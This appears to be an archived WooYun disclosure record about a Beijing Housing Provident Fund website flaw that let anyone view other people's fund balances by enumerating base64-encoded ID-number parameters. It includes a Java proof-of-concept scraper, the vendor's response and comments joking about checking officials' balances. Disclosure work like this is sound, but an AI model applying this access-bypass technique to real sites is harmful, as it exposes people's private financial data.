{"id": 48039, "wybug_id": "wooyun-2014-084486", "wybug_title": "北京住房公积金管理中心无需登录查看别人公积金金额", "wybug_corp": "北京住房公积金管理中心", "wybug_author": "stevenliu", "wybug_date": "2014-11-24 14:47", "wybug_open_date": "2015-01-08 14:48", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向公众公开  简要描述： 北京住房公积金网 可以用他人身份证查询那个人的住房公积金余额。 详细说明：  通过登录北京住房公积金网站查询\n\n登录后 可以根据自己的Cookie访问别人的urlhttp://www.bjgjj.gov.cn/wsyw/wscx/gjj_cx.jsp?grdjhh=XXX&gjjzh=YYY&vnv=ZZZ&lx=0其中参数grdjhh、gjjzh、vnv里面的值经发现是base64加密grdjhh是身份证后面加00然后base64加密gjjzh是GJJ后面接9位数字 其中那9位数字遍历只要知道身份证就能查询其他用户金额。vnv应该是有过几家公司上的住房公积金在测试中发现cookie会失效 测试同事的住房公积金 完全不需要登录账号密码和身份证号密码 就可以查询他们的信息。还有就是在查询的时候发现get提交的vnv的value可以不添加 也可以查询。   漏洞证明：  \npublic static void main(String[] args) throws ClientProtocolException, IOException {\t\tDefaultHttpClient httpclient = new DefaultHttpClient();  \t\thttpclient = new DefaultHttpClient();\t\tString lastUrl = \"http://www.bjgjj.gov.cn/wsyw/wscx/gjj_cx.jsp?grdjhh=xxx&gjjzh=xxx&vnv=xxx&lx=0\";\t\tHttpResponse hr = cartSearch(lastUrl, httpclient);\t\tDocument doc = Jsoup.parse(getBody(hr));\t\tSystem.out.println(doc.text());\t\tElement ele = doc.select(\"font[class=style2]\").first();\t\tSystem.out.println(ele.text());\t\tElement info = doc.select(\"table[bordercolor=#CCCCCC]\").first();\t\tSystem.out.println(info.text());\t\tSystem.out.println(\"=============================================\");\t\tElements detial = doc.select(\"table[bordercolor=#CCCCCC]\").last().select(\"tbody > tr\");\t\tfor (Element eles : detial) {\t\t\tSystem.out.println(eles.text());\t\t}\t}\t\tprivate static HttpResponse cartSearch(String url,DefaultHttpClient httpclient){\t\t\t\tHttpGet get = new HttpGet(url);\t\tget.setHeader(\"Cookie\", \"JSESSIONID=xxx.tomcat4; _gscu_1252996743=xxx; _gscbrs_1252996743=1; JSESSIONID=xxx.tomcat4; _gscs_1252996743=xxx|pv:8\");\t\tHttpResponse response = null;\t\ttry{\t\tresponse = httpclient.execute(get); \t\t}catch(Exception ex){\t\t\t\t\t}\t\treturn response;\t}\t\tprivate static String getBody(HttpResponse httpResponse){\t\tHttpEntity entity = httpResponse.getEntity();\t\t String responseBody = \"\";\t\t try{\t\t responseBody = EntityUtils.toString(entity);\t\t }catch(Exception ex){}\t\treturn responseBody;\t}\n\n\n   修复方案：  cookie权限过滤不严谨有可能是直接返回true就可查询。自行解决吧。   版权声明：转载请注明来源 stevenliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-11-28 15:23 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-24 15:37 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  恩，不错，可以看看乌云的管理员公积金都有多少    \n     2014-11-24 15:50 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @pandas 哈哈 乌云管理员公积金很少 看了 怕楼主伤心啊。    \n     2014-11-24 17:32 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  不用密码还是缺省密码    \n     2014-11-24 17:46 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @爱Gail 这个等确认了告诉你把 反正不用被查询人的密码！    \n     2014-11-24 18:56 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  标题党。。。。    \n     2014-11-24 18:57 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  某些单位领导的住房公积金福利可是相当的....  貌似是敏感的    \n     2014-11-24 22:46 |    \t\tseamaner \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | 实习就这么难呢，路人之路真漫长)\t\t \n  @淡漠天空 得同一公司的？    \n     2014-11-25 10:01 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @淡漠天空 标题党飞过！    \n     2014-11-25 10:02 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @seamaner 不是同一公司 只要知道身份证号 就能查    \n     2014-11-25 10:02 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @zeracker 好 查查他 ！！    \n     2014-11-25 13:40 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  我自己的，我都登陆不上    \n     2014-11-25 17:07 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @大大灰狼 你还用查住房公积金    \n     2014-11-25 20:07 |    \t\tcmxz \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:13        | )\t\t \n  @stevenliu 我试了一下，输入任意身份证密码再输入正确验证码点击提交后发情请求到gjjcx-choice.jsp 但是gjjcx-choice.jsp没有返回数据，然后就跳转到gjjcx-logineoor.jsp?id=3所以猜测当输入正确的身份证号码密码后会返回身份证号（或身份证号加密后的字符串，然后带着这个字符串请求某个url就可以进入了    \n     2014-11-26 10:50 |    \t\tstevenliu \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 从事信息网络完全)\t\t \n  @cmxz 等那边返回信息吧 不是从这里的 反正是越权 等住房公积金回复后告诉你啥原理吧！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}